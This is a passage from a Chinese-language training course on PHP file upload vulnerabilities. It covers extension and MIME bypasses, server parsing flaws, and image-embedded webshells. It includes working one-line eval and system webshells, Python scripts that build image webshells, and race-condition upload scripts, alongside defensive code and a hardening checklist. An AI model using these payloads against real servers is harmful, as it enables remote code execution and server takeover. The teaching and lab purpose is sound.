$safe_htaccess = "php_flag engine off";
file_put_contents("uploads/.htaccess", $safe_htaccess);
?>
```

#### 3.8 .user.ini文件攻击(PHP-CGI模式)

**原理**:PHP-CGI模式下,`.user.ini`文件可以配置PHP行为,类似`.htaccess`。

**攻击步骤**:

步骤1:上传`.user.ini`:
```ini
auto_prepend_file=shell.jpg
```

步骤2:上传`shell.jpg`:
```php
<?php @eval($_POST['cmd']); ?>
```

步骤3:访问该目录下的任意PHP文件,会自动包含`shell.jpg`。

**防御方法**:
```php
<?php
// ✅ 禁止上传配置文件
$forbidden_files = array('.htaccess', '.user.ini', 'web.config');

if (in_array(strtolower($filename), $forbidden_files, true)) {
    die("禁止上传配置文件!");
}
?>
```

### 四、黑白名单绕过技巧

#### 4.1 黑名单的问题

**黑名单示例**:
```php
<?php
$blacklist = array('.php', '.asp', '.jsp');
$ext = strtolower(strrchr($_FILES['uploadfile']['name'], '.'));

if (in_array($ext, $blacklist, true)) {
    die("禁止上传该类型文件!");
}
?>
```

**黑名单的问题**:
1. ❌ 无法穷举所有危险后缀
2. ❌ 容易遗漏特殊后缀(如`.phtml`、`.php5`)
3. ❌ 不同Web服务器解析方式不同
4. ❌ 可能存在大小写、空格等绕过

**常见遗漏的后缀**:

| 后缀名 | 说明 | 适用环境 |
|--------|------|----------|
| `.phtml` | PHP HTML模板 | Apache |
| `.php3/4/5/7` | PHP旧版本 | Apache配置不当 |
| `.inc` | Include文件 | 配置不当 |
| `.asa/.cer` | ASP相关 | IIS |
| `.aspx/.ashx` | ASP.NET | IIS |
| `.jsp/.jspx` | Java Server Pages | Tomcat |

#### 4.2 白名单的实现

**白名单示例**:
```php
<?php
// ✅ 推荐:白名单验证
$whitelist = array('.jpg', '.jpeg', '.png', '.gif');
$ext = strtolower(strrchr($_FILES['uploadfile']['name'], '.'));

if (!in_array($ext, $whitelist, true)) {
    die("只允许上传图片文件!");
}
?>
```

**白名单的优势**:
1. ✅ 只允许明确的安全类型
2. ✅ 不会遗漏危险类型
3. ✅ 更容易维护
4. ✅ 更安全的默认策略(拒绝所有,只允许部分)

#### 4.3 绕过不完善的白名单

**情况1:只检查是否包含允许的后缀**

漏洞代码:
```php
<?php
// ⚠️ 错误:使用strpos检查
$filename = $_FILES['uploadfile']['name'];

if (strpos($filename, '.jpg') !== false) {
    move_uploaded_file($tmp_name, "uploads/" . $filename);
}
?>
```

绕过方法:
上传文件名:`shell.php.jpg`或`shell.jpg.php`

`strpos`检查包含`.jpg`即可,但实际文件可能是PHP文件。

**情况2:只检查开头或结尾**

漏洞代码:
```php
<?php
// ⚠️ 错误:只检查结尾
$filename = $_FILES['uploadfile']['name'];

if (substr($filename, -4) === '.jpg') {
    move_uploaded_file($tmp_name, "uploads/" . $filename);
}
?>
```

这个看似安全,但在Apache某些配置下,访问`shell.php.jpg`时,Apache从右往左匹配后缀,如果`.jpg`未配置处理程序,会继续匹配`.php`,导致PHP代码执行。

#### 4.4 Apache解析漏洞

**Apache从右向左解析**:

Apache的解析顺序:从右往左匹配扩展名,直到遇到能识别的扩展名。

示例:上传文件`shell.php.xxx.yyy`

Apache处理:
1. 检查`.yyy` → 不认识,跳过
2. 检查`.xxx` → 不认识,跳过
3. 检查`.php` → 认识,当作PHP执行

**绕过示例**:
- `shell.php.aaa`
- `shell.php.test`
- `shell.php.7z`

**防御方法**:
```apache
# 在httpd.conf或.htaccess中添加
<FilesMatch "\.php">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# 或者在上传目录禁用PHP
php_flag engine off
```

#### 4.5 IIS解析漏洞

**IIS 6.0解析漏洞**:

1. **目录解析**:
   - 如果目录名包含`.asp`,该目录下所有文件都会当作ASP执行
   - 示例:`/uploads/shell.asp/1.jpg`会被当作ASP执行

2. **文件解析**:
   - `shell.asp;.jpg`会被当作ASP执行(分号后的被忽略)

**IIS 7.0/7.5解析漏洞**:

Fast-CGI模式下,在文件路径后加`/.php`:
```
http://example.com/uploads/shell.jpg/.php
```

IIS会将`shell.jpg`当作PHP执行。

**防御方法**:
1. 升级IIS版本
2. 修复Fast-CGI配置
3. 禁止上传目录执行脚本

#### 4.6 Nginx解析漏洞

**Nginx < 0.8.37解析漏洞**:

在Fast-CGI模式下,访问:
```
http://example.com/uploads/shell.jpg%00.php
http://example.com/uploads/shell.jpg/.php
```

Nginx会将`shell.jpg`当作PHP执行。

**防御方法**:
```nginx
# 在nginx.conf中修复
location ~ \.php$ {
    try_files $uri =404;
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    # 其他配置...
}

# 或者禁止上传目录执行PHP
location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
}
```

### 五、文件内容伪装

即使绕过了扩展名和MIME检查,还可能面临文件内容检测。攻击者需要伪装文件内容,使其通过检测,但仍能执行恶意代码。

#### 5.1 图片马制作

**原理**:在图片文件中插入PHP代码,通过文件包含漏洞或`.htaccess`配置使其执行。

**制作方法1:使用copy命令(Windows)**:

```bash
copy 正常图片.jpg /b + shell.php /a 图片马.jpg
```

**制作方法2:使用cat命令(Linux)**:

```bash
cat 正常图片.jpg shell.php > 图片马.jpg
```

**制作方法3:使用十六进制编辑器**:

1. 打开正常图片文件(如test.jpg)
2. 在文件末尾添加PHP代码:
```php
<?php @eval($_POST['cmd']); ?>
```
3. 保存为图片马.jpg

**图片马示例结构**:
```
[JPEG文件头: FF D8 FF E0...]
[图片数据...]
[JPEG文件尾: FF D9]
<?php @eval($_POST['cmd']); ?>
```

**利用方式**:

方法1:通过文件包含漏洞:
```php
// 存在文件包含漏洞的页面
include($_GET['file']);
```

访问:
```
http://example.com/include.php?file=uploads/图片马.jpg
```

方法2:通过.htaccess使图片当作PHP执行(见3.7节)

#### 5.2 GIF文件头伪造

**原理**:某些网站使用`getimagesize()`检测图片,可以伪造GIF文件头绕过。

**GIF文件头**:
- GIF89a:`GIF89a`(十六进制:`47 49 46 38 39 61`)
- GIF87a:`GIF87a`(十六进制:`47 49 46 38 37 61`)

**伪造示例**:

```php
GIF89a
<?php phpinfo(); ?>
```

保存为`shell.gif`,这个文件:
- 能通过`getimagesize()`检查(有GIF文件头)
- 如果服务器配置不当,可以当作PHP执行

**攻击示例**:

1. 创建`shell.gif`:
```php
GIF89a
<?php @eval($_POST['cmd']); ?>
```

2. 上传该文件

3. 如果存在文件包含漏洞或配置不当,访问该文件即可执行PHP代码

#### 5.3 PNG/JPEG文件头伪造

**PNG文件头**:
```
89 50 4E 47 0D 0A 1A 0A
```

**JPEG文件头**:
```
FF D8 FF E0
```

**伪造示例**:

使用Python生成带有正确文件头的恶意文件:

```python
# 生成PNG图片马
png_header = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
php_code = b'<?php @eval($_POST["cmd"]); ?>'

with open('shell.png', 'wb') as f:
    f.write(png_header + php_code)
```

```python
# 生成JPEG图片马
jpeg_header = b'\xFF\xD8\xFF\xE0'
php_code = b'<?php @eval($_POST["cmd"]); ?>'

with open('shell.jpg', 'wb') as f:
    f.write(jpeg_header + php_code)
```

#### 5.4 二次渲染绕过

**问题**:某些网站会对上传的图片进行二次渲染(压缩、裁剪、缩放),导致插入的PHP代码被破坏。

**二次渲染示例代码**:
```php
<?php
// 对图片进行二次渲染
$source = imagecreatefromjpeg($_FILES['uploadfile']['tmp_name']);
imagejpeg($source, 'uploads/processed.jpg', 90);  // 重新生成图片
imagedestroy($source);
?>
```

经过二次渲染,图片末尾的PHP代码会被清除。

**绕过方法**:

1. **寻找渲染后不变的区域**:
   - 分析原图和渲染后的图片,找到二进制数据不变的区域
   - 在该区域插入PHP代码

2. **使用工具**:
   - [jpg_payload](https://github.com/BlackFan/jpg_payload) - 生成能抵抗二次渲染的JPEG图片马

3. **利用其他漏洞**:
   - 配合文件包含漏洞
   - 配合任意文件读取漏洞
   - 配合解压缩漏洞

#### 5.5 条件竞争绕过

**原理**:某些网站先保存文件,再检测文件内容,如果检测到恶意代码才删除。利用时间差,在删除前访问该文件。

**漏洞代码**:
```php
<?php
// 1. 先保存文件
$filename = $_FILES['uploadfile']['name'];
$tmp_name = $_FILES['uploadfile']['tmp_name'];
$upload_path = "uploads/" . $filename;

move_uploaded_file($tmp_name, $upload_path);

// 2. 再检查文件内容
$content = file_get_contents($upload_path);

if (strpos($content, '<?php') !== false) {
    unlink($upload_path);  // 删除恶意文件
    die("检测到恶意代码!");
}

echo "上传成功";
?>
```

**利用方法**:

脚本1(upload.py):不断上传Webshell
```python
import requests

url = 'http://target.com/upload.php'

while True:
    files = {'uploadfile': ('shell.php', '<?php @eval($_POST["cmd"]); ?>', 'image/jpeg')}
    requests.post(url, files=files)
```

脚本2(access.py):不断访问上传的文件
```python
import requests

url = 'http://target.com/uploads/shell.php'

while True:
    response = requests.get(url)
    if response.status_code == 200:
        print("访问成功!")
        break
```

同时运行两个脚本,在文件被删除前访问到,即可执行PHP代码。

**防御方法**:
```php
<?php
// ✅ 先检查,后保存
$tmp_name = $_FILES['uploadfile']['tmp_name'];

// 先在临时文件上检查
$content = file_get_contents($tmp_name);
if (strpos($content, '<?php') !== false) {
    die("检测到恶意代码!");
}

// 检查通过后再移动文件
$new_filename = md5(uniqid()) . '.jpg';
move_uploaded_file($tmp_name, "uploads/" . $new_filename);
?>
```

### 六、服务器校验绕过

#### 6.1 文件包含漏洞配合

如果网站存在文件包含漏洞,即使文件上传限制很严格,也可以利用。

**漏洞代码**:
```php
<?php
// 存在文件包含漏洞
$page = $_GET['page'];
include($page);
?>
```

**利用步骤**:

1. 上传图片马`test.jpg`(包含PHP代码)
2. 通过文件包含漏洞包含该文件:
```
http://target.com/include.php?page=uploads/test.jpg
```

3. 图片中的PHP代码被执行

#### 6.2 文件上传+文件解析漏洞

**示例**:Apache解析漏洞

1. 上传`shell.php.7z`(白名单允许.7z)
2. 如果Apache配置不当,访问`shell.php.7z`时,会当作PHP执行

**示例**:Nginx解析漏洞

1. 上传`shell.jpg`
2. 访问`shell.jpg/.php`,Nginx会将shell.jpg当作PHP执行

#### 6.3 00截断上传

**PHP < 5.3.4漏洞**:

漏洞代码:
```php
<?php
$filename = $_POST['name'];  // 用户可控
$ext = '.jpg';  // 强制扩展名
$upload_path = "uploads/" . $filename . $ext;

move_uploaded_file($_FILES['file']['tmp_name'], $upload_path);
?>
```

攻击:
1. POST提交:`name=shell.php%00`
2. 拼接后:`uploads/shell.php%00.jpg`
3. `%00`被解析为NULL,字符串截断
4. 实际保存为:`uploads/shell.php`

**防御**:
- 升级PHP版本
- 不要将用户输入拼接到文件路径中
- 使用随机文件名

#### 6.4 move_uploaded_file竞争

**原理**:利用`move_uploaded_file()`的时间窗口。

**攻击脚本**:
```python
import threading
import requests

def upload():
    while True:
        files = {'file': ('shell.php', '<?php phpinfo(); ?>')}
        requests.post('http://target.com/upload.php', files=files)

def access():
    while True:
        r = requests.get('http://target.com/uploads/shell.php')
        if 'phpinfo' in r.text:
            print("Success!")
            return

# 多线程上传+访问
for i in range(10):
    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()
```

---

## 第三部分:文件上传实战(2小时)

### 一、靶场环境搭建

#### 1.1 靶场架构

本靶场包含10个不同难度的文件上传关卡,每个关卡对应一种防护机制和绕过方法。

**靶场结构**:
```
file-upload-lab/
├── index.php              # 靶场首页
├── level1.php             # 关卡1:无任何验证
├── level2.php             # 关卡2:前端JavaScript验证
├── level3.php             # 关卡3:MIME类型验证
├── level4.php             # 关卡4:黑名单验证
├── level5.php             # 关卡5:白名单验证+大小写绕过
├── level6.php             # 关卡6:白名单验证+空格/点绕过
├── level7.php             # 关卡7:文件内容检测
├── level8.php             # 关卡8:图片二次渲染
├── level9.php             # 关卡9:.htaccess绕过
├── level10.php            # 关卡10:综合防护
├── uploads/               # 文件上传目录
└── shells/                # Webshell示例
    ├── shell.php          # 基础Webshell
    ├── shell.gif          # GIF图片马
    └── shell.jpg          # JPEG图片马
```

#### 1.2 环境要求

| 组件 | 版本 | 说明 |
|------|------|------|
| PHP | 5.4 - 7.4 | 某些关卡需要旧版本PHP |
| Apache | 2.4+ | 用于.htaccess相关关卡 |
| 操作系统 | Windows/Linux | 某些关卡特定于Windows |

#### 1.3 部署步骤

1. **Windows(PHPStudy)**:
   - 将靶场代码放在`WWW`目录下
   - 访问`http://localhost/file-upload-lab/`

2. **Linux(LAMP)**:
   ```bash
   # 复制文件到网站根目录
   cp -r file-upload-lab /var/www/html/

   # 设置权限
   chmod 755 /var/www/html/file-upload-lab
   chmod 777 /var/www/html/file-upload-lab/uploads

   # 访问
   http://localhost/file-upload-lab/
   ```

### 二、靶场关卡详解

#### Level 1:无任何验证

**关卡描述**:最基础的文件上传,服务器没有任何验证措施。

**通关目标**:上传PHP Webshell并成功访问。

**通关步骤**:
1. 准备Webshell文件`shell.php`
2. 直接上传
3. 访问`uploads/shell.php`
4. 执行系统命令

**详细步骤**:见靶场代码部分

---

#### Level 2:前端JavaScript验证

**关卡描述**:使用JavaScript在客户端检查文件扩展名。

**通关目标**:绕过前端验证,上传PHP文件。

**绕过方法**:
- 方法1:禁用JavaScript
- 方法2:Burp Suite拦截修改
- 方法3:浏览器控制台删除验证

**详细步骤**:见靶场代码部分

---

#### Level 3:MIME类型验证

**关卡描述**:服务器检查`$_FILES['file']['type']`。

**通关目标**:伪造MIME类型上传PHP文件。

**绕过方法**:
使用Burp Suite修改Content-Type为`image/jpeg`

**详细步骤**:见靶场代码部分

---

#### Level 4:黑名单验证

**关卡描述**:服务器使用黑名单禁止`.php`等扩展名。

**通关目标**:使用黑名单中未包含的PHP扩展名。

**绕过方法**:
上传`.phtml`、`.php5`、`.php3`等

**详细步骤**:见靶场代码部分

---

#### Level 5:白名单验证(大小写绕过)

**关卡描述**:白名单验证,但未转换大小写。

**通关目标**:使用大小写绕过。

**绕过方法**:
上传`shell.PhP`、`shell.PHP`

**详细步骤**:见靶场代码部分

---

#### Level 6:空格和点号绕过

**关卡描述**:白名单验证,但未处理空格和点号。

**通关目标**:利用Windows特性绕过。

**绕过方法**:
上传`shell.php `(末尾空格)或`shell.php.`(末尾点号)

**详细步骤**:见靶场代码部分

---

#### Level 7:文件内容检测

**关卡描述**:使用`getimagesize()`检测图片。

**通关目标**:制作图片马绕过检测。

**绕过方法**:
制作GIF图片马,配合文件包含漏洞利用。

**详细步骤**:见靶场代码部分

---

#### Level 8:图片二次渲染

**关卡描述**:上传后对图片进行二次渲染。

**通关目标**:绕过二次渲染,保留恶意代码。

**绕过方法**:
找到渲染后不变的区域,插入代码。

**详细步骤**:见靶场代码部分

---

#### Level 9:.htaccess攻击

**关卡描述**:允许上传任意扩展名,但禁止PHP。

**通关目标**:上传.htaccess文件,使图片当作PHP执行。

**绕过方法**:
1. 上传`.htaccess`
2. 上传`shell.jpg`(包含PHP代码)

**详细步骤**:见靶场代码部分

---

#### Level 10:综合防护

**关卡描述**:多重验证(扩展名、MIME、文件头、大小)。

**通关目标**:综合运用多种技巧绕过。

**绕过方法**:
根据具体防护措施,组合使用前面学习的技巧。

**详细步骤**:见靶场代码部分

---

### 三、实战工具使用

#### 3.1 Burp Suite

**功能**:拦截、修改HTTP请求

**使用步骤**:
1. 配置浏览器代理:`127.0.0.1:8080`
2. 打开Burp Suite,确保Proxy → Intercept is on
3. 上传文件,Burp会拦截请求
4. 修改`filename`和`Content-Type`
5. 点击Forward发送

**修改示例**:
```http
修改前:
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

修改后:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

#### 3.2 HackBar

**功能**:快速构造和修改URL、POST数据

**使用方法**:
1. 安装HackBar浏览器插件
2. 按F9打开HackBar
3. 切换到POST Data
4. 输入POST参数
5. 点击Execute

#### 3.3 Python脚本

**批量上传脚本**:
```python
import requests

url = 'http://localhost/file-upload-lab/level1.php'
files = {'uploadfile': ('shell.php', '<?php phpinfo(); ?>', 'image/jpeg')}

response = requests.post(url, files=files)
print(response.text)
```

**条件竞争脚本**:
见第二部分5.5节

---

### 四、Webshell的使用

#### 4.1 基础Webshell

```php
<?php
// 基础一句话木马
@eval($_POST['cmd']);
?>
```

**使用方法**:
使用中国菜刀、蚁剑、哥斯拉等工具连接:
- URL:`http://target.com/uploads/shell.php`
- 密码:`cmd`

#### 4.2 phpinfo()测试

```php
<?php phpinfo(); ?>
```

上传成功后访问该文件,如果能看到PHP配置信息,说明代码执行成功。

#### 4.3 命令执行Webshell

```php
<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
```

**使用**:
```
http://target.com/uploads/shell.php?cmd=whoami
http://target.com/uploads/shell.php?cmd=ls -la
```

---

### 五、实战技巧总结

#### 5.1 信息收集

1. **判断Web服务器类型**:
   - 查看HTTP响应头的`Server`字段
   - 使用Wappalyzer等工具

2. **判断是否允许上传**:
   - 查找上传功能(头像上传、附件上传等)
   - 分析上传表单

3. **判断验证方式**:
   - 查看前端JavaScript代码
   - 尝试上传不同类型文件,观察返回信息

#### 5.2 攻击流程

```
1. 寻找上传点
   ↓
2. 测试验证机制(前端/后端/MIME/扩展名/内容)
   ↓
3. 选择合适的绕过方法
   ↓
4. 构造恶意文件
   ↓
5. 上传并记录路径
   ↓
6. 访问上传的文件
   ↓
7. 确认代码执行
   ↓
8. 进一步渗透(提权、内网渗透等)
```

#### 5.3 常见错误

| 错误 | 原因 | 解决方法 |
|------|------|----------|
| 上传成功但无法访问 | 文件路径不对 | 查看上传返回的路径 |
| 访问文件直接下载 | 服务器未解析 | 检查扩展名是否正确 |
| 上传后被删除 | 服务器检测到恶意代码 | 使用图片马或条件竞争 |
| 代码被转义 | 经过了二次渲染 | 寻找不被渲染的区域 |

---

## 课程总结

### 核心知识点

| 模块 | 核心要点 |
|------|----------|
| **原理篇** | HTTP上传机制、$_FILES数组、文件保存流程 |
| **绕过篇** | 前端绕过、MIME绕过、后缀名绕过、文件内容伪装 |
| **实战篇** | 靶场通关、工具使用、Webshell利用 |

### 安全防护建议

#### 开发者角度

1. ✅ 使用白名单验证扩展名
2. ✅ 使用`finfo`检测真实MIME类型
3. ✅ 检查文件内容(文件头、二次渲染)
4. ✅ 随机文件名,不使用用户提供的文件名
5. ✅ 上传目录禁止执行脚本(.htaccess)
6. ✅ 限制文件大小和上传频率
7. ✅ 存储文件到独立域名或对象存储
8. ✅ 定期审计上传目录

#### 渗透测试角度

1. 🔍 枚举所有上传功能点
2. 🔍 测试不同验证绕过方法
3. 🔍 尝试配合其他漏洞(文件包含、解析漏洞)
4. 🔍 注意时间窗口(条件竞争)
5. 🔍 测试不同文件类型的解析
6. 🔍 检查上传目录权限配置

